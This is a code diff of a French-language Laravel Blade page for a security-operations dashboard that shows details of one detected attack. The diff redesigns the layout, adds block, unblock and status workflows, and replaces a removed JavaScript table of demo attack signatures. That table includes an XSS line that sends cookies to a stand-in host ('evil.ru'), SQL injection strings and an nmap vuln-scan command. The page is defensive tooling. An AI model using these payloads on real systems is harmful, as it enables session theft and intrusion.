@@ -1,240 +1,341 @@
 @extends('layouts.app')
 @section('title', 'Détail Attaque #' . $attack->id)
-@section('page-title', '🔍 Analyse Attaque #' . $attack->id)
-
-@push('styles')
-@endpush
+@section('page-title', 'Fiche incident #' . $attack->id)
+@section('page-subtitle', 'Analyse détaillée de l’attaque, contexte technique et actions SOC associées.')
 
 @section('content')
+    @php
+        $canManageAttack = auth()->user()?->hasRole('admin');
+        $isBlocked = \App\Models\BlockedIp::isBlocked($attack->source_ip) || $attack->status === 'blocked';
+        $scores = [
+            'critical' => 95,
+            'high' => 75,
+            'medium' => 50,
+            'low' => 25,
+        ];
+        $score = $scores[$attack->severity] ?? 40;
+        $scoreColors = [
+            'critical' => '#ff5d7a',
+            'high' => '#fb923c',
+            'medium' => '#facc15',
+            'low' => '#3ddc97',
+        ];
+        $scoreColor = $scoreColors[$attack->severity] ?? '#4adeff';
+        $deg = ($score / 100) * 360;
+        $demoPayloads = [
+            'DDoS' => 'UDP flood detecte sur plusieurs ports applicatifs avec un rythme anormalement eleve.',
+            'SQL Injection' => 'Suite de requetes suspectes avec signatures UNION SELECT et contournement d authentification.',
+            'XSS' => 'Charge utile de script injectee dans un champ applicatif avec tentative d exfiltration de session.',
+            'Brute Force' => 'Serie de tentatives d authentification sur un compte expose avec rotation rapide des mots de passe.',
+            'Port Scan' => 'Balayage multi ports sur la cible avec enumeration des services disponibles.',
+            'Ransomware' => 'Comportement de chiffrement massif et connexions vers une infrastructure de commande.',
+            'MITM' => 'Alteration du trafic et signatures de poisoning reseau detectees sur le segment.',
+        ];
+        $payloadText = trim((string) $attack->payload) !== ''
+            ? $attack->payload
+            : ($demoPayloads[$attack->type] ?? 'Aucune charge utile exploitable n a ete conservee pour cet incident.');
+    @endphp
 
-    <!-- Header breadcrumb -->
-    <div class="attack-header">
-        <a href="{{ route('attacks.index') }}" class="btn btn-primary btn-sm">
-            <i class="fas fa-arrow-left"></i> Retour
-        </a>
-        <span class="badge badge-{{ $attack->severity }} badge-small">
-            {{ $attack->severity_icon }} {{ strtoupper($attack->severity) }}
-        </span>
-        @if($attack->is_simulation)
-            <span class="badge badge-sim">⚗️ SIMULATION</span>
-        @endif
-        @if($attack->status === 'blocked')
-            <span class="badge badge-low badge-small">🛡️ BLOQUÉE</span>
-        @else
-            <button class="btn btn-danger btn-sm" id="block-btn" onclick="blockThis({{ $attack->id }})">
-                <i class="fas fa-ban"></i> Bloquer cette IP
-            </button>
-        @endif
-    </div>
+    <div
+        id="attack-show-page"
+        data-severity="{{ $attack->severity }}"
+        data-block-url="{{ route('attacks.block', ['id' => $attack->id]) }}"
+        data-unblock-url="{{ route('attacks.unblock', ['id' => $attack->id]) }}"
+        data-status-url="{{ route('attacks.status', ['id' => $attack->id]) }}"
+    >
+        <section class="incident-hero">
+            <div class="incident-hero-main">
+                <a href="{{ route('attacks.index') }}" class="btn btn-secondary-outline btn-sm">
+                    <i class="fas fa-arrow-left"></i> Retour à la liste
+                </a>
 
-    <div class="detail-grid">
-        <!-- Colonne principale -->
-        <div>
-            <!-- Info principale -->
-            <div class="card mb-4">
-                <div class="attack-summary">
+                <div class="attack-summary attack-summary--hero">
                     <div class="attack-icon">{{ $attack->type_icon }}</div>
                     <div>
                         <div class="attack-title">{{ $attack->type }}</div>
                         <div class="attack-meta">
-                            Détectée {{ $attack->created_at->diffForHumans() }} • ID #{{ $attack->id }}
+                            Détectée {{ $attack->created_at->diffForHumans() }} · Source {{ $attack->source_ip }} · Cible {{ $attack->target_ip }}
                         </div>
                     </div>
                 </div>
 
-                <div class="info-block">
-                    <div class="info-row">
-                        <span class="info-key">IP Source</span>
-                        <span class="info-val"><span class="ip-addr info-val--small">{{ $attack->source_ip }}</span></span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Localisation</span>
-                        <span class="info-val">🌍 {{ $attack->city }}, {{ $attack->country }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Fournisseur (ISP)</span>
-                        <span class="info-val">{{ $attack->isp ?? 'Inconnu' }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Coordonnées GPS</span>
-                        <span class="info-val mono info-val--small">{{ $attack->latitude }}, {{ $attack->longitude }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">IP Cible</span>
-                        <span class="info-val"><span
-                                class="ip-addr">{{ $attack->target_ip }}</span>:{{ $attack->target_port }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Protocole</span>
-                        <span class="info-val">{{ $attack->protocol }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Paquets reçus</span>
-                        <span class="info-val text-accent-cyan">{{ number_format($attack->packet_count) }}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-key">Bande passante</span>
-                        <span class="info-val text-accent-orange">{{ $attack->bandwidth_mbps }} Mbps</span>
-                    </div>
-                </div>
-
-                @if($attack->description)
-                    <div class="description-card">
-                        <div class="description-label">DESCRIPTION</div>
-                        <div class="description-box">
-                            {{ $attack->description }}
-                        </div>
-                    </div>
-                @endif
-            </div>
-
-            <!-- Payload simulé -->
-            <div class="card mb-4">
-                <div class="section-title section-title--spaced">📦 Payload / Signature d'Attaque</div>
-                <div class="payload-box" id="payload-display">{{ $attack->payload ?? '' }}</div>
-                <button class="btn btn-primary btn-sm btn-center" onclick="generatePayload('{{ $attack->type }}')">
-                    <i class="fas fa-sync"></i> Générer payload de démonstration
-                </button>
-            </div>
-
-            <!-- Timeline -->
-            <div class="card">
-                <div class="section-title" style="margin-bottom:14px;">📅 Timeline</div>
-                <div class="timeline-item">
-                    <div>
-                        <div style="font-weight:600; margin-bottom:2px;">Attaque détectée</div>
-                        <div style="font-size:12px; color:var(--text-muted);">
-                            {{ $attack->created_at->format('d/m/Y H:i:s') }}</div>
-                    </div>
-                </div>
-                <div class="timeline-item" style="border-left-color: var(--accent-orange);">
-                    <div>
-                        <div style="font-weight:600; margin-bottom:2px;">Analyse automatique lancée</div>
-                        <div style="font-size:12px; color:var(--text-muted);">
-                            {{ $attack->created_at->addSeconds(2)->format('d/m/Y H:i:s') }}</div>
-                    </div>
-                </div>
-                @if($attack->alarm_triggered)
-                    <div class="timeline-item" style="border-left-color: var(--accent-red);">
-                        <div>
-                            <div style="font-weight:600; margin-bottom:2px;">🔊 Alarme sonore déclenchée</div>
-                            <div style="font-size:12px; color:var(--text-muted);">
-                                {{ $attack->created_at->addSeconds(3)->format('d/m/Y H:i:s') }}</div>
-                        </div>
-                    </div>
-                @endif
-                @if($attack->status === 'blocked')
-                    <div class="timeline-item" style="border-left-color: var(--accent-green);">
-                        <div>
-                            <div style="font-weight:600; margin-bottom:2px;">🛡️ IP bloquée</div>
-                            <div style="font-size:12px; color:var(--text-muted);">
-                                {{ $attack->updated_at->format('d/m/Y H:i:s') }}</div>
-                        </div>
-                    </div>
-                @endif
-            </div>
-        </div>
-
-        <!-- Colonne droite -->
-        <div>
-            <!-- Score de menace -->
-            <div class="card" style="margin-bottom:16px; text-align:center;">
-                <div class="section-title" style="margin-bottom:16px; justify-content:center;">Score de Menace</div>
-                @php
-                    $score = match ($attack->severity) {
-                        'critical' => 95, 'high' => 75, 'medium' => 50, 'low' => 25, default => 40
-                    };
-                    $scoreColor = match ($attack->severity) {
-                        'critical' => '#ff0040', 'high' => '#ff6b00', 'medium' => '#ffd600', 'low' => '#00ff88', default => '#00e5ff'
-                    };
-                    $deg = ($score / 100) * 360;
-                @endphp
-                <div class="threat-score" style="--score-color:{{ $scoreColor }}; --score-deg:{{ $deg }}deg;">
-                    <div class="threat-score-val">{{ $score }}</div>
-                </div>
-                <div style="font-size:20px; font-weight:700; color:{{ $scoreColor }};">{{ strtoupper($attack->severity) }}
-                </div>
-                <div style="font-size:12px; color:var(--text-muted); margin-top:4px;">Score /100</div>
-            </div>
-
-            <!-- Géoloc -->
-            <div class="card" style="margin-bottom:16px;">
-                <div class="section-title" style="margin-bottom:14px;">📍 Localisation</div>
-                <div style="
-                    height: 160px;
-                    background: var(--bg-secondary);
-                    border-radius: 8px;
-                    display: flex; align-items: center; justify-content: center;
-                    position: relative; overflow: hidden; margin-bottom:12px;
-                ">
-                    <svg viewBox="0 0 300 160" style="width:100%;height:100%;" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="300" height="160" fill="#050a0f" />
-                        <g stroke="rgba(0,229,255,0.06)" stroke-width="0.5">
-                            @for($i = 0; $i < 6; $i++)
-                                <line x1="{{ $i * 50 }}" y1="0" x2="{{ $i * 50 }}" y2="160" />
-                            @endfor
-                            @for($i = 0; $i < 4; $i++)
-                                <line x1="0" y1="{{ $i * 40 }}" x2="300" y2="{{ $i * 40 }}" />
-                            @endfor
-                        </g>
-                        <!-- Marqueur attaquant -->
-                        <circle cx="150" cy="80" r="8" fill="{{ $scoreColor }}" opacity="0.9" />
-                        <circle cx="150" cy="80" r="8" fill="none" stroke="{{ $scoreColor }}" stroke-width="1.5"
-                            opacity="0.5">
-                            <animate attributeName="r" from="8" to="25" dur="1.5s" repeatCount="indefinite" />
-                            <animate attributeName="opacity" from="0.5" to="0" dur="1.5s" repeatCount="indefinite" />
-                        </circle>
-                        <text x="160" y="76" font-family="Share Tech Mono" font-size="9"
-                            fill="{{ $scoreColor }}">{{ $attack->source_ip }}</text>
-                        <text x="160" y="88" font-family="Share Tech Mono" font-size="8"
-                            fill="rgba(255,255,255,0.4)">{{ $attack->city }}</text>
-                    </svg>
-                </div>
-
-                <div style="font-size:12px; display:grid; gap:6px;">
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--text-muted);">Pays</span>
-                        <strong>{{ $attack->country }}</strong>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--text-muted);">Ville</span>
-                        <strong>{{ $attack->city }}</strong>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--text-muted);">ISP</span>
-                        <strong>{{ $attack->isp }}</strong>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--text-muted);">Lat / Lon</span>
-                        <strong class="mono" style="font-size:11px;">{{ $attack->latitude }},
-                            {{ $attack->longitude }}</strong>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Actions -->
-            <div class="card">
-                <div class="section-title" style="margin-bottom:14px;">⚡ Actions Défensives</div>
-                <div style="display:grid; gap:8px;">
-                    @if($attack->status !== 'blocked')
-                        <button class="btn btn-danger" style="justify-content:center;" id="block-btn-side"
-                            onclick="blockThis({{ $attack->id }})">
-                            <i class="fas fa-ban"></i> Bloquer IP {{ $attack->source_ip }}
-                        </button>
+                <div class="incident-hero-badges">
+                    <x-badge class="badge-{{ $attack->severity }} badge-small">
+                        {{ $attack->severity_icon }} {{ strtoupper($attack->severity) }}
+                    </x-badge>
+                    <x-badge class="badge-{{ $attack->status }} badge-small">{{ strtoupper($attack->status) }}</x-badge>
+                    @if($attack->is_simulation)
+                        <x-badge class="badge-sim">SIMULATION</x-badge>
                     @endif
-                    <button class="btn btn-warning" style="justify-content:center;"
-                        onclick="triggerAlarm('{{ $attack->severity }}')">
-                        <i class="fas fa-volume-up"></i> Tester Alarme
-                    </button>
-                    <a href="{{ route('geo.trace', $attack->source_ip) }}" class="btn btn-primary"
-                        style="justify-content:center;">
-                        <i class="fas fa-crosshairs"></i> Tracer l'Attaquant
-                    </a>
-                    <a href="{{ route('attacks.index') }}" class="btn btn-sm"
-                        style="justify-content:center; background:rgba(0,229,255,0.05); color:var(--text-muted); border:1px solid var(--border);">
-                        <i class="fas fa-list"></i> Toutes les attaques
-                    </a>
                 </div>
+            </div>
+
+            <div class="incident-hero-side">
+                <div class="incident-key-stat">
+                    <span>Score de menace</span>
+                    <strong>{{ $score }}/100</strong>
+                </div>
+                <div class="incident-key-stat">
+                    <span>Incident</span>
+                    <strong>{{ $attack->incident_id ?: 'Non corrélé' }}</strong>
+                </div>
+                <div class="incident-key-stat">
+                    <span>Règle</span>
+                    <strong>{{ $attack->rule?->name ?? $attack->rule_id ?? 'Détection interne' }}</strong>
+                </div>
+            </div>
+        </section>
+
+        <section class="incident-summary-grid">
+            <div class="incident-summary-card">
+                <span>Source</span>
+                <strong>{{ $attack->source_ip }}</strong>
+                <small>{{ $attack->city ?: 'Ville inconnue' }}, {{ $attack->country ?: 'Pays inconnu' }}</small>
+            </div>
+            <div class="incident-summary-card">
+                <span>Cible</span>
+                <strong>{{ $attack->target_ip }}@if($attack->target_port):{{ $attack->target_port }}@endif</strong>
+                <small>{{ $attack->protocol ?: 'Protocole non précisé' }}</small>
+            </div>
+            <div class="incident-summary-card">
+                <span>Volume</span>
+                <strong>{{ number_format($attack->packet_count) }} paquets</strong>
+                <small>{{ $attack->bandwidth_mbps }} Mbps observés</small>
+            </div>
+            <div class="incident-summary-card">
+                <span>Traitement</span>
+                <strong>{{ $isBlocked ? 'Contenu' : 'À traiter' }}</strong>
+                <small>{{ $attack->updated_at->format('d/m/Y H:i') }}</small>
+            </div>
+        </section>
+
+        <div class="detail-grid detail-grid--incident">
+            <div class="stack-md">
+                <div class="card dashboard-panel">
+                    <div class="section-title section-title--spaced">Synthèse incident</div>
+                    <div class="info-block">
+                        <div class="info-row">
+                            <span class="info-key">IP Source</span>
+                            <span class="info-val"><span class="ip-addr info-val--small">{{ $attack->source_ip }}</span></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Localisation</span>
+                            <span class="info-val">🌍 {{ $attack->city ?: 'Inconnue' }}, {{ $attack->country ?: 'Inconnu' }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Fournisseur</span>
+                            <span class="info-val">{{ $attack->isp ?? 'Inconnu' }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Coordonnées GPS</span>
+                            <span class="info-val mono info-val--small">{{ $attack->latitude }}, {{ $attack->longitude }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">IP Cible</span>
+                            <span class="info-val">
+                                <span class="ip-addr">{{ $attack->target_ip }}</span>@if($attack->target_port):{{ $attack->target_port }}@endif
+                            </span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Protocole</span>
+                            <span class="info-val">{{ $attack->protocol ?: 'Non précisé' }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Paquets reçus</span>
+                            <span class="info-val text-accent-cyan">{{ number_format($attack->packet_count) }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Bande passante</span>
+                            <span class="info-val text-accent-orange">{{ $attack->bandwidth_mbps }} Mbps</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-key">Statut</span>
+                            <span class="info-val">{{ strtoupper($attack->status) }}</span>
+                        </div>
+                    </div>
+
+                    <div class="description-card">
+                        <div class="description-label">Résumé analytique</div>
+                        <div class="description-box">
+                            {{ $attack->description ?: "L’attaque a été classée comme {$attack->type} avec une sévérité {$attack->severity}. Cette fiche centralise les éléments utiles à la démonstration SOC et à la prise de décision." }}
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card dashboard-panel">
+                    <div class="section-title section-title--spaced">Indicateurs techniques</div>
+                    <div class="payload-box" id="payload-display">{{ $payloadText }}</div>
+                </div>
+
+                <div class="card dashboard-panel">
+                    <div class="section-title section-title--spaced">Timeline de traitement</div>
+                    <div class="timeline-item">
+                        <div>
+                            <div class="timeline-title">Attaque détectée</div>
+                            <div class="timeline-meta">{{ $attack->created_at->format('d/m/Y H:i:s') }}</div>
+                        </div>
+                    </div>
+                    <div class="timeline-item timeline-item--warning">
+                        <div>
+                            <div class="timeline-title">Analyse initiale</div>
+                            <div class="timeline-meta">{{ $attack->created_at->copy()->addSeconds(2)->format('d/m/Y H:i:s') }}</div>
+                        </div>
+                    </div>
+                    @if($attack->rule)
+                        <div class="timeline-item">
+                            <div>
+                                <div class="timeline-title">Règle corrélée</div>
+                                <div class="timeline-meta">{{ $attack->rule->name }} · {{ $attack->rule->severity ?? 'niveau non précisé' }}</div>
+                            </div>
+                        </div>
+                    @endif
+                    @if($attack->alarm_triggered)
+                        <div class="timeline-item timeline-item--danger">
+                            <div>
+                                <div class="timeline-title">Alerte renforcée</div>
+                                <div class="timeline-meta">{{ $attack->created_at->copy()->addSeconds(3)->format('d/m/Y H:i:s') }}</div>
+                            </div>
+                        </div>
+                    @endif
+                    @if($isBlocked)
+                        <div class="timeline-item timeline-item--success">
+                            <div>
+                                <div class="timeline-title">IP bloquée</div>
+                                <div class="timeline-meta">{{ $attack->updated_at->format('d/m/Y H:i:s') }}</div>
+                            </div>
+                        </div>
+                    @endif
+                </div>
+            </div>
+
+            <div class="stack-md">
+                <div class="card dashboard-panel threat-card">
+                    <div class="section-title section-title--center">Score de menace</div>
+                    <div class="threat-score" style="--score-color:{{ $scoreColor }}; --score-deg:{{ $deg }}deg;">
+                        <div class="threat-score-val">{{ $score }}</div>
+                    </div>
+                    <div class="text-highlight threat-level" style="--score-color:{{ $scoreColor }};">{{ strtoupper($attack->severity) }}</div>
+                    <div class="text-muted-small">Score /100</div>
+                </div>
+
+                <div class="card dashboard-panel">
+                    <div class="section-title section-title--spaced">Décision et actions</div>
+                    <div class="action-grid">
+                        @if($canManageAttack && ! $isBlocked)
+                            <button class="btn btn-danger btn-center" id="block-btn" type="button">
+                                <i class="fas fa-ban"></i> Bloquer l’IP source
+                            </button>
+                        @endif
+                        @if($canManageAttack && $isBlocked)
+                            <button class="btn btn-warning btn-center" id="unblock-btn" type="button">
+                                <i class="fas fa-unlock"></i> Débloquer l’IP source
+                            </button>
+                        @endif
+                        <a href="{{ route('geo.trace', $attack->source_ip) }}" class="btn btn-primary btn-center">
+                            <i class="fas fa-crosshairs"></i> Tracer l’attaquant
+                        </a>
+                    </div>
+                </div>
+
+                <div class="card dashboard-panel">
+                    <div class="section-title section-title--spaced">Contexte source</div>
+                    <div class="location-panel">
+                        <svg viewBox="0 0 300 160" class="location-map" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="300" height="160" fill="#050a0f" />
+                            <g stroke="rgba(0,229,255,0.06)" stroke-width="0.5">
+                                @for($i = 0; $i < 6; $i++)
+                                    <line x1="{{ $i * 50 }}" y1="0" x2="{{ $i * 50 }}" y2="160" />
+                                @endfor
+                                @for($i = 0; $i < 4; $i++)
+                                    <line x1="0" y1="{{ $i * 40 }}" x2="300" y2="{{ $i * 40 }}" />
+                                @endfor
+                            </g>
+                            <circle cx="150" cy="80" r="8" fill="{{ $scoreColor }}" opacity="0.9" />
+                            <circle cx="150" cy="80" r="8" fill="none" stroke="{{ $scoreColor }}" stroke-width="1.5" opacity="0.5">
+                                <animate attributeName="r" from="8" to="25" dur="1.5s" repeatCount="indefinite" />
+                                <animate attributeName="opacity" from="0.5" to="0" dur="1.5s" repeatCount="indefinite" />
+                            </circle>
+                            <text x="160" y="76" font-family="IBM Plex Mono" font-size="9" fill="{{ $scoreColor }}">{{ $attack->source_ip }}</text>
+                            <text x="160" y="88" font-family="IBM Plex Mono" font-size="8" fill="rgba(255,255,255,0.4)">{{ $attack->city }}</text>
+                        </svg>
+                    </div>
+
+                    <div class="location-summary">
+                        <div class="location-row">
+                            <span class="text-muted-small">Pays</span>
+                            <strong>{{ $attack->country ?: 'Inconnu' }}</strong>
+                        </div>
+                        <div class="location-row">
+                            <span class="text-muted-small">Ville</span>
+                            <strong>{{ $attack->city ?: 'Inconnue' }}</strong>
+                        </div>
+                        <div class="location-row">
+                            <span class="text-muted-small">ISP</span>
+                            <strong>{{ $attack->isp ?: 'Inconnu' }}</strong>
+                        </div>
+                        <div class="location-row">
+                            <span class="text-muted-small">Lat / Lon</span>
+                            <strong class="mono location-small">{{ $attack->latitude }}, {{ $attack->longitude }}</strong>
+                        </div>
+                    </div>
+                </div>
+
+                @if($canManageAttack)
+                    <div class="card dashboard-panel">
+                        <div class="section-title section-title--spaced">Workflow SOC</div>
+                        <div class="control-stack">
+                            <div>
+                                <label for="attack-status" class="form-label">Nouveau statut</label>
+                                <select id="attack-status" class="form-control">
+                                    <option value="investigating" @selected($attack->status === 'investigating')>Investigating</option>
+                                    <option value="blocked" @selected($attack->status === 'blocked')>Blocked</option>
+                                    <option value="false_positive" @selected($attack->status === 'false_positive')>False Positive</option>
+                                    <option value="resolved" @selected($attack->status === 'resolved')>Resolved</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label for="attack-comment" class="form-label">Commentaire</label>
+                                <textarea id="attack-comment" rows="4" class="form-control" placeholder="Capture d'analyse, décision SOC, justification...">{{ old('comment') }}</textarea>
+                            </div>
+                            <button class="btn btn-primary btn-center" id="soc-action-btn" type="button">
+                                <i class="fas fa-check-circle"></i> Mettre à jour le statut
+                            </button>
+                        </div>
+                    </div>
+                @endif
+
+                @if($attack->comments->isNotEmpty())
+                    <div class="card dashboard-panel">
+                        <div class="section-title section-title--spaced">Journal SOC</div>
+                        <div class="list-stack">
+                            @foreach($attack->comments as $comment)
+                                <div class="comment-card">
+                                    <div class="comment-meta">
+                                        <strong>{{ $comment->user?->name ?? 'Système' }}</strong>
+                                        <span>{{ ucfirst($comment->status) }}</span>
+                                        <span>{{ $comment->created_at->diffForHumans() }}</span>
+                                    </div>
+                                    <div class="comment-text">{{ $comment->comment ?? 'Aucune note' }}</div>
+                                </div>
+                            @endforeach
+                        </div>
+                    </div>
+                @endif
+
+                @if($relatedAttacks->isNotEmpty())
+                    <div class="card dashboard-panel">
+                        <div class="section-title section-title--spaced">Attaques corrélées</div>
+                        <div class="list-stack">
+                            @foreach($relatedAttacks as $related)
+                                <a href="{{ route('attacks.show', $related->id) }}" class="related-attack-card">
+                                    <div><strong>#{{ $related->id }} {{ $related->type }}</strong></div>
+                                    <div>{{ $related->source_ip }} · {{ $related->status }}</div>
+                                    <div>{{ $related->created_at->diffForHumans() }}</div>
+                                </a>
+                            @endforeach
+                        </div>
+                    </div>
+                @endif
             </div>
         </div>
     </div>
@@ -242,40 +343,78 @@
 
 @push('scripts')
     <script>
-        const payloads = {
-            'DDoS': 'UDP FLOOD | Size: 1400B | Rate: 45000pps\nSrc: SPOOFED | Protocol: UDP/53,80,443\n[SYN][SYN][SYN][SYN]... (repeated x100000)',
-            'SQL Injection': "GET /login?id=1' OR '1'='1' --\nUser-Agent: sqlmap/1.7.8\nPayload: 1 UNION SELECT username,password FROM users--",
-            'XSS': "<script>document.cookie='session='+btoa(document.cookie);\nnew Image().src='http://evil.ru/steal?c='+encodeURIComponent(document.cookie)\n</scr" + "ipt>",
-            'Brute Force': "POST /wp-login.php HTTP/1.1\nContent: log=admin&pwd=password123\nAttempts: 547/min | Dict: rockyou.txt\n[FAILED][FAILED][FAILED]...",
-            'Port Scan': "NMAP SCAN DETECTED\nnmap -sS -sV -O -p- --script vuln 10.0.0.1\nPorts found: 22/SSH 80/HTTP 443/HTTPS 3306/MySQL",
-            'Ransomware': "BEHAVIOR DETECTED: Mass file encryption\nExtension: .locked | Files: 2847\nC2: 185.220.101.x | Key: RSA-4096",
-            'MITM': "ARP POISONING DETECTED\nReal GW: aa:bb:cc:dd:ee:ff\nFake GW: 11:22:33:44:55:66\nSSL STRIP attempt on port 443",
-        };
+        const attackPage = document.getElementById('attack-show-page');
 
-        function generatePayload(type) {
-            const p = payloads[type] || `ATTACK SIGNATURE [${type}]\nTimestamp: ${new Date().toISOString()}\nPayload: ENCRYPTED/OBFUSCATED DATA`;
-            document.getElementById('payload-display').textContent = p;
-        }
-
-        generatePayload('{{ $attack->type }}');
-
-        async function blockThis(id) {
-            const btns = document.querySelectorAll('#block-btn, #block-btn-side');
-            btns.forEach(b => { b.disabled = true; b.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Blocage...'; });
-            const res = await csrfFetch(`/attacks/block/${id}`, { method: 'POST' });
-            const data = await res.json();
-            if (data.success) {
-                showToast('🛡️ IP Bloquée!', data.message, 'low');
-                btns.forEach(b => { b.style.background = 'rgba(0,255,136,0.1)'; b.style.color = 'var(--accent-green)'; b.innerHTML = '✅ Bloquée'; });
+        function bindClick(id, handler) {
+            const element = document.getElementById(id);
+            if (element) {
+                element.addEventListener('click', handler);
             }
         }
 
-        // Auto-alarm si critique
-        @if($attack->severity === 'critical' && $attack->status !== 'blocked')
-            document.addEventListener('click', function once() {
-                triggerAlarm('critical');
-                document.removeEventListener('click', once);
-            }, { once: true });
-        @endif
+        async function blockThis() {
+            const btn = document.getElementById('block-btn');
+            const blockUrl = attackPage?.dataset.blockUrl;
+
+            if (!blockUrl || !btn) {
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Blocage...';
+
+            const res = await csrfFetch(blockUrl, { method: 'POST' });
+            const data = await res.json();
+
+            if (data.success) {
+                showToast(data.message, data.already ? 'info' : 'success');
+                window.location.reload();
+            }
+        }
+
+        async function unblockThis() {
+            const unblockUrl = attackPage?.dataset.unblockUrl;
+
+            if (!unblockUrl) {
+                return;
+            }
+
+            const res = await csrfFetch(unblockUrl, { method: 'POST' });
+            const data = await res.json();
+
+            if (data.success) {
+                showToast(data.message, data.already ? 'info' : 'success');
+                window.location.reload();
+            }
+        }
+
+        async function updateAttackStatus() {
+            const statusUrl = attackPage?.dataset.statusUrl;
+            const status = document.getElementById('attack-status').value;
+            const comment = document.getElementById('attack-comment').value;
+            const button = document.getElementById('soc-action-btn');
+
+            if (!statusUrl || !button) {
+                return;
+            }
+
+            button.disabled = true;
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mise à jour...';
+
+            const res = await csrfFetch(statusUrl, {
+                method: 'POST',
+                body: JSON.stringify({ status, comment }),
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                showToast(data.message, data.already ? 'info' : 'success');
+                window.location.reload();
+            }
+        }
+
+        bindClick('block-btn', blockThis);
+        bindClick('unblock-btn', unblockThis);
+        bindClick('soc-action-btn', updateAttackStatus);
     </script>
 @endpush
